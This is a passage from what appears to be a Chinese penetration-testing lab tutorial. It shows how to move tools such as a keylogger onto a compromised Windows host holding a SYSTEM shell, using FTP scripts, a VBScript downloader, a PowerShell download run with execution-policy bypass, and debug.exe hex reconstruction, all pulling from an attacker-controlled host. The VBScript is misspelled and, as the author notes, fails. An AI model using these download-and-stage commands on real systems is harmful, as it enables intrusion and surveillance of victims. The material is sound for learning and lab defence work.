+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># apt-get install pure-ftpd</span></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree   </span><br><span class="line">Reading state information... Done</span><br><span class="line">The following additional packages will be installed:</span><br><span class="line">  libcrypt1 libpam0g pure-ftpd-common</span><br><span class="line">Suggested packages:</span><br><span class="line">……………………</span><br></pre></td></tr></table></figure>
+<p><strong>配置脚本(ftp1.sh)：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">groupadd ftpgroup</span><br><span class="line">useradd -g ftpgroup -d /dev/null -s /etc ftpuser</span><br><span class="line">pure-pw useradd yuanfh -u ftpuser -d /ftphome</span><br><span class="line">pure-pw mkdb</span><br><span class="line"><span class="built_in">cd</span> /etc/pure-ftpd/auth/</span><br><span class="line"><span class="built_in">ln</span> -s ../conf/PureDB 60pdb</span><br><span class="line"><span class="built_in">mkdir</span> -p /ftphome</span><br><span class="line"><span class="built_in">chown</span> -R ftpuser:ftpgroup /ftphome/                   <span class="comment">#创建的ftp主目录</span></span><br><span class="line">/etc/init.d/pure-ftpd restart</span><br></pre></td></tr></table></figure>
+<p><strong>脚本执行：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/tftp<span class="comment"># ./ftp1.sh </span></span><br><span class="line">Password:      <span class="comment">#此处设的密码要记住，后面会需要</span></span><br><span class="line">Enter it again: </span><br><span class="line">Restarting pure-ftpd (via systemctl): pure-ftpd.service. </span><br></pre></td></tr></table></figure>
+<p><strong>要上传的工具复制到 /ftphome/ 下</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/<span class="comment"># ls /ftphome/</span></span><br><span class="line">root@kali:/<span class="comment"># cp /usr/share/windows-binaries/whoami.exe /ftphome/</span></span><br><span class="line">root@kali:/<span class="comment"># cp /usr/share/windows-binaries/klogger.exe /ftphome/</span></span><br></pre></td></tr></table></figure>
+<p><strong>测试ftp:</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207141421494-985347852.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207143159410-1225108199.png" /></p>
+<p>由于目前获得的shell是非交互模式的，ftp传输时，在password命令处无法显示，所以当前直接利用ftp下载行不通，故转换思路：将要实现的命令写到目标服务器的文本文件中，用ftp读取文本文件的命令进行下载即可。</p>
+<p><strong>2.2 上传文件</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;<span class="built_in">echo</span> open 10.10.10.171 21&gt;ftp.txt     </span><br><span class="line"><span class="built_in">echo</span> yuanfh&gt;&gt;ftp.txt</span><br><span class="line"><span class="built_in">echo</span> password&gt;&gt;ftp.txt　　　　<span class="comment">#password是前面设置的密码</span></span><br><span class="line"><span class="built_in">echo</span> bin&gt;&gt;ftp.txt</span><br><span class="line"><span class="built_in">echo</span> GET whoami.exe &gt;&gt; ftp.txt</span><br><span class="line"><span class="built_in">echo</span> GET klogger.exe &gt;&gt; ftp.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">bye</span> &gt;&gt; ftp.txt</span><br><span class="line"> <span class="built_in">echo</span> open 10.10.10.171 21&gt;ftp.txt</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> yuanfh&gt;&gt;ftp.txt</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> password&gt;&gt;ftp.txt</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> bin&gt;&gt;ftp.txt</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> GET whoami.exe &gt;&gt; ftp.txt</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> GET klogger.exe &gt;&gt; ftp.txt</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> <span class="built_in">bye</span> &gt;&gt; ftp.txt</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">type</span> ftp.txt</span><br><span class="line"><span class="built_in">type</span> ftp.txt</span><br><span class="line">open 10.10.10.171 21</span><br><span class="line">yuanfh</span><br><span class="line">password</span><br><span class="line">bin</span><br><span class="line">GET whoami.exe </span><br><span class="line">GET klogger.exe </span><br><span class="line"><span class="built_in">bye</span> </span><br><span class="line"></span><br><span class="line">C:\&gt;ftp -s:ftp.txt</span><br><span class="line">ftp -s:ftp.txt</span><br><span class="line">User (10.10.10.171:(none)): open 10.10.10.171 21</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bin</span><br><span class="line">GET whoami.exe </span><br><span class="line">GET klogger.exe </span><br><span class="line"><span class="built_in">bye</span> </span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 0CCA-0323</span><br><span class="line"></span><br><span class="line"> Directory of C:\</span><br><span class="line"></span><br><span class="line">02/07/2022  12:54 PM                30 1.txt</span><br><span class="line">08/14/2011  01:35 PM                 0 AUTOEXEC.BAT</span><br><span class="line">08/14/2011  01:35 PM                 0 CONFIG.SYS</span><br><span class="line">01/28/2022  01:28 PM    &lt;DIR&gt;          Documents and Settings</span><br><span class="line">02/07/2022  02:25 PM                89 ftp.txt</span><br><span class="line">02/07/2022  11:40 AM             1,120 HistorySvr.txt</span><br><span class="line">01/28/2010  06:10 PM    &lt;DIR&gt;          I386</span><br><span class="line">02/07/2022  11:49 AM    &lt;DIR&gt;          Inetpub</span><br><span class="line">02/07/2022  02:26 PM            23,552 klogger.exe</span><br><span class="line">01/28/2022  01:38 PM    &lt;DIR&gt;          Program Files</span><br><span class="line">01/27/2022  07:46 PM    &lt;DIR&gt;          Python27</span><br><span class="line">02/07/2022  12:27 PM                 0 TFTP4092</span><br><span class="line">02/07/2022  12:25 PM                 0 TFTP588</span><br><span class="line">02/07/2022  02:26 PM            66,560 whoami.exe</span><br><span class="line">02/07/2022  11:49 AM    &lt;DIR&gt;          WINDOWS</span><br><span class="line">               9 File(s)         91,351 bytes</span><br><span class="line">               6 Dir(s)  39,067,385,856 bytes free</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">whoami</span> </span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">C:\&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="vbscript传输">3、Vbscript传输</h3>
+<p>VBS是windows系统上默认的解释型脚本语言，在win7后增加了perl，通过web程序，http协议下载远程控制程序。</p>
+<p><strong>3.1 环境部署</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/<span class="comment"># cd /var/www/html/</span></span><br><span class="line">root@kali:/var/www/html<span class="comment"># ls</span></span><br><span class="line">index.html  index.nginx-debian.html</span><br><span class="line">root@kali:/var/www/html<span class="comment"># cp /ftphome/* .</span></span><br><span class="line">root@kali:/var/www/html<span class="comment"># ls</span></span><br><span class="line">index.html  index.nginx-debian.html  klogger.exe  whoami.exe</span><br><span class="line">root@kali:/var/www/html<span class="comment"># service apache2 start</span></span><br><span class="line">root@kali:/var/www/html<span class="comment"># netstat -pantu | grep 80</span></span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      27486/apache2    </span><br></pre></td></tr></table></figure>
+<p><strong>3.2 文件传输</strong></p>
+<p><strong>命令集：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> strUrl = WScript.Arguments.Item(0) &gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Const HTTPREQUEST_PROXSEITTING_DEFAULT = 0 &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Const HTTPREQUEST_PROXSEITTING_PRECONFIG = 0 &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Const HTTPREQUEST_PROXSEITTING_DIRECT = 1 &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Const HTTPREQUEST_PROXSEITTING_PROXY = 2 &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Dim http, varByteArray, strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Err.Clear &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Set http = CreateObject(<span class="string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> If http Is Noting Then Set http = CreateObjiect(<span class="string">&quot;WinHttp.WinHttpRequest&quot;</span>) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> If http Is Noting Then Set http = CreateObjiect(<span class="string">&quot;WinHttp.MSXML2.ServerXMLHTTP&quot;</span>) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> If http Is Noting Then Set http = CreateObjiect(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> http.Open <span class="string">&quot;GET&quot;</span>,strURL,False &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> http.Send &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> varByteArray = http.ResponseBody &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Set http = Noting &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Set fs = CreateObject(<span class="string">&quot;Scrippting.FileSystemObject&quot;</span>) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> strData = <span class="string">&quot;&quot;</span> &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> strBuffer = <span class="string">&quot;&quot;</span> &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> ts.Write Chr(255 And Ascb(Miidb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> Next &gt;&gt; wget.vbs</span><br><span class="line"><span class="built_in">echo</span> ts.Close &gt;&gt; wget.vbs</span><br></pre></td></tr></table></figure>
+<p>将以上命令粘贴到 shell 窗口后再执行cscript wget.vbs
+http://10.10.10.171/whoami.exe
+w.exe（windows系统自带的cscipt命令去下载whoami.exe 命名成w.exe）</p>
+<p><strong>脚本执行报错信息（未解决，哪位大佬看出问题了，烦请指导下，感激不尽）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;cscript wget.vbs http://10.10.10.171/whoami.exe whoami.exe</span><br><span class="line">cscript wget.vbs http://10.10.10.171/whoami.exe whoami.exe</span><br><span class="line">Microsoft (R) Windows Script Host Version 5.7</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\wget.vbs(3, 6) Microsoft VBScript compilation error: Syntax error</span><br></pre></td></tr></table></figure>
+<h3 id="powershell传输">4、POWERSHELL传输</h3>
+<p>类似vbs的传输，依旧是到目标服务器下载程序，注意需在win7,win8以后的系统运行。</p>
+<p><strong>命令集</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$strongeDir</span> = <span class="variable">$pwd</span></span><br><span class="line"><span class="variable">$webclient</span> = New-Object System.Net.WebClient</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://10.10.10.171/whoami.exe&quot;</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;new-exsploit.exe&quot;</span></span><br><span class="line"><span class="variable">$webclient</span> DownloadFile(<span class="variable">$url</span>,<span class="variable">$file</span>)</span><br></pre></td></tr></table></figure>
+<p><strong>执行脚本：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass  -NoLogo -Nonlnteractive -Noprofile -File wget.ps1</span><br></pre></td></tr></table></figure>
+<h3 id="debug传输">5、Debug传输</h3>
+<p>Debug是一种汇编、反汇编的16进制dump工具，作为文件传输，默认情况下
+<strong>只能传输64k字节的数据</strong>
+，并且可以修改Bios，考虑我们能不能直接把二进制的文件一行一行地echo进一个文件中，答案是否定的，不过这个思路是可以的，我们需要变通一下，将二进制文件转换成文本类型，之后进行传输，最后再用debug命令转化为二进制格式。</p>
+<p><strong>Kali 端的压缩</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/test<span class="comment"># ls -alh whoami.exe </span></span><br><span class="line">-rwxr-xr-x 1 root root 65K Feb  7 03:09 whoami.exe</span><br><span class="line">root@kali:~/Desktop/test<span class="comment"># upx -9 whoami.exe     #-9：最高程度的压缩</span></span><br><span class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2018</span><br><span class="line">UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">     66560 -&gt;     21113   31.72%    win32/pe     whoami.exe                    </span><br><span class="line"></span><br><span class="line">Packed 1 file.</span><br><span class="line">root@kali:~/Desktop/test<span class="comment"># ls -alh whoami.exe </span></span><br><span class="line">-rwxr-xr-x 1 root root 21K Feb  7 03:09 whoami.exe</span><br></pre></td></tr></table></figure>
+<p><strong>将需要传的二进制文件转换为文本文件</strong></p>
+<p><strong>以whoami.exe为例（将/usr/share/windows-binaries/exe2bat.exe和whoami.exe拷贝到windows下）：</strong></p>
+<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207161845658-1776705172.png" /></strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207161926497-359527144.png" /></p>
+<p>当然kali下也可以转换，只不过需要安装window程序的执行环境（wine）</p>
+<p>详情参见：<a
+target="_blank" rel="noopener" href="https://www.cnblogs.com/z9m8r8/articles/15864240.html"
+class="uri">https://www.cnblogs.com/z9m8r8/articles/15864240.html</a></p>
+<p><strong>传输文件</strong></p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;echo</span> n 1.dll <span class="op">&gt;</span>123.hex</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>    <span class="bu">echo</span> e 0100 <span class="op">&gt;&gt;</span>123.hex</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    <span class="bu">echo</span> 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d8 00 00 00 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00  <span class="op">&gt;&gt;</span>123.hex </span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>    <span class="bu">echo</span> e 0180 <span class="op">&gt;&gt;</span>123.hex</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">……………………</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">……………………</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">……………………</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;echo</span> r cx <span class="op">&gt;&gt;</span>123.hex</span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;echo</span> 5279 <span class="op">&gt;&gt;</span>123.hex</span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;echo</span> w <span class="op">&gt;&gt;</span>123.hex</span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;echo</span> q <span class="op">&gt;&gt;</span>123.hex</span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;dir</span></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a>    <span class="fu">dir</span></span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Volume</span> in drive C has no label.</span>
+<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Volume</span> Serial Number is 0CCA-0323</span>
+<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Directory</span> of C:<span class="dt">\</span></span>
+<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  12:54 PM                30 1.txt</span>
+<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a>    <span class="ex">**02</span> /07/2022  04:21 PM            65,516 123.hex</span>
+<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a>    <span class="ex">**08/14/2011</span>  01:35 PM                 0 AUTOEXEC.BAT</span>
+<span id="cb1-27"><a href="#cb1-27" aria-hidden="true" tabindex="-1"></a>    <span class="ex">08/14/2011</span>  01:35 PM                 0 CONFIG.SYS</span>
+<span id="cb1-28"><a href="#cb1-28" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2022</span>  01:28 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Documents and Settings</span>
+<span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:00 PM             1,176 HistorySvr.txt</span>
+<span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2010</span>  06:10 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          I386</span>
+<span id="cb1-31"><a href="#cb1-31" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  11:49 AM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Inetpub</span>
+<span id="cb1-32"><a href="#cb1-32" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/28/2022</span>  01:38 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Program Files</span>
+<span id="cb1-33"><a href="#cb1-33" aria-hidden="true" tabindex="-1"></a>    <span class="ex">01/27/2022</span>  07:46 PM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          Python27</span>
+<span id="cb1-34"><a href="#cb1-34" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:30 PM               172 test.ps1</span>
+<span id="cb1-35"><a href="#cb1-35" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  12:27 PM                 0 TFTP4092</span>
+<span id="cb1-36"><a href="#cb1-36" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  12:25 PM                 0 TFTP588</span>
+<span id="cb1-37"><a href="#cb1-37" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  03:21 PM             1,113 wget.vbs</span>
+<span id="cb1-38"><a href="#cb1-38" aria-hidden="true" tabindex="-1"></a>    <span class="ex">02/07/2022</span>  11:49 AM    <span class="op">&lt;</span>DIR<span class="op">&gt;</span>          WINDOWS</span>
+<span id="cb1-39"><a href="#cb1-39" aria-hidden="true" tabindex="-1"></a>                   <span class="ex">9</span> File<span class="er">(</span><span class="ex">s</span><span class="kw">)</span>         <span class="ex">68,007</span> bytes</span>
+<span id="cb1-40"><a href="#cb1-40" aria-hidden="true" tabindex="-1"></a>                   <span class="ex">6</span> Dir<span class="er">(</span><span class="ex">s</span><span class="kw">)</span>  <span class="ex">39,068,635,136</span> bytes free</span>
+<span id="cb1-41"><a href="#cb1-41" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb1-42"><a href="#cb1-42" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;debug</span><span class="op">&lt;</span>123.hex</span>
+<span id="cb1-43"><a href="#cb1-43" aria-hidden="true" tabindex="-1"></a>    <span class="ex">debug</span><span class="op">&lt;</span>123.hex</span>
+<span id="cb1-44"><a href="#cb1-44" aria-hidden="true" tabindex="-1"></a>    <span class="ex">-n</span> 1.dll </span>
+<span id="cb1-45"><a href="#cb1-45" aria-hidden="true" tabindex="-1"></a>    <span class="ex">-e</span> 0100 </span>
+<span id="cb1-46"><a href="#cb1-46" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:0100</span>  24.</span>
+<span id="cb1-47"><a href="#cb1-47" aria-hidden="true" tabindex="-1"></a>    <span class="ex">4d</span>   99.5a   04.90   80.00   0E.03   1E.00   99.00   04.00   </span>
+<span id="cb1-48"><a href="#cb1-48" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:0108</span>  80.04   3E.00   1F.00   99.00   00.ff   75.ff   24.00   80.00   </span>
+<span id="cb1-49"><a href="#cb1-49" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:0110</span>  3E.b8   62.00   97.00   01.00   74.00   1D.00   E8.00   5B.00   </span>
+<span id="cb1-50"><a href="#cb1-50" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:0118</span>  03.40   75.00   18.00   80.00   34.00   00.00   B9.00   0A.00   </span>
+<span id="cb1-51"><a href="#cb1-51" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:0120</span>  75.00   11.00   BA.00   EC.00   89.00   E8.00   4B.00   10.00   </span>
+<span id="cb1-52"><a href="#cb1-52" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:0128</span>  C7.00   06.00   21.00   96.00   00.00   00.00   FE.00   06.00   </span>
+<span id="cb1-53"><a href="#cb1-53" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:0130</span>  23.00   99.00   C3.00   8B.00   1E.00   5F.00   98.00   33.00 </span>
+<span id="cb1-54"><a href="#cb1-54" aria-hidden="true" tabindex="-1"></a>    <span class="ex">……………………</span></span>
+<span id="cb1-55"><a href="#cb1-55" aria-hidden="true" tabindex="-1"></a>    <span class="ex">……………………</span></span>
+<span id="cb1-56"><a href="#cb1-56" aria-hidden="true" tabindex="-1"></a>    <span class="ex">……………………</span></span>
+<span id="cb1-57"><a href="#cb1-57" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:5370</span>  00.00   00.00   00.00   00.00   00.00   00.00   00.00   00.00   </span>
+<span id="cb1-58"><a href="#cb1-58" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0ACA:5378</span>  00.00   00.     00.     00.</span>
+<span id="cb1-59"><a href="#cb1-59" aria-hidden="true" tabindex="-1"></a>    <span class="ex">-r</span> cx </span>
+<span id="cb1-60"><a href="#cb1-60" aria-hidden="true" tabindex="-1"></a>    <span class="ex">CX</span> 0000</span>
+<span id="cb1-61"><a href="#cb1-61" aria-hidden="true" tabindex="-1"></a>    <span class="ex">:5279</span> </span>
+<span id="cb1-62"><a href="#cb1-62" aria-hidden="true" tabindex="-1"></a>    <span class="ex">-w</span> </span>
+<span id="cb1-63"><a href="#cb1-63" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Writing</span> 05279 bytes</span>
+<span id="cb1-64"><a href="#cb1-64" aria-hidden="true" tabindex="-1"></a>    <span class="ex">-q</span> </span>
+<span id="cb1-65"><a href="#cb1-65" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb1-66"><a href="#cb1-66" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C:\&gt;dir</span></span>
+<span id="cb1-67"><a href="#cb1-67" aria-hidden="true" tabindex="-1"></a>    <span class="fu">dir</span></span>
+<span id="cb1-68"><a href="#cb1-68" aria-hidden="true" tabindex="-1"></a>     <span class="ex">Volume</span> in drive C has no label.</span>
